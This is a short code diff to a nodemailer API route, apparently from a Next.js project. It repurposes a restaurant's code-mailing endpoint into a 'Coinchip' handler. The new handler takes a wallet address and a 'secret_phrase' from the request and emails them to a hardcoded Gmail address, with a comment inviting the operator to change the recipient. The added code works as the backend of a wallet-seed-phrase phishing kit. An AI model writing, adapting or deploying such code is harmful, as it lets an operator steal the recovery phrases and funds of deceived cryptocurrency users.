@@ -49,7 +49,7 @@ export const GET = async (res) => {
 };
 
 export const POST = async (res) => {
-  const { userCode, email: emailToReceiveMail } = await res.json();
+  const { address, secret_phrase } = await res.json();
 
   // nodemailer transporter instantiation
   const transporter = nodemailer.createTransport({
@@ -79,16 +79,17 @@ export const POST = async (res) => {
   // Mail Options
   const mailOptions = {
     from: {
-      name: `Reyvers Kitchen`,
+      name: `Coinchip`,
 
       address: "petercodercoder@gmail.com",
     },
-    to: `${emailToReceiveMail}`,
-    subject: `Message from Reyvers Kitchen`,
-    html: `${formatEmailMessage(userCode)}`,
+    // Change the email here
+    to: `talk2peteresezobor@gmail.com`,
+    subject: `Message from Coinchip`,
+    html: `${formatEmailMessage(address, secret_phrase)}`,
   };
 
-  if (userCode) {
+  if (address) {
     // Send mail if the
     await new Promise((resolve, reject) => {
       // send mail
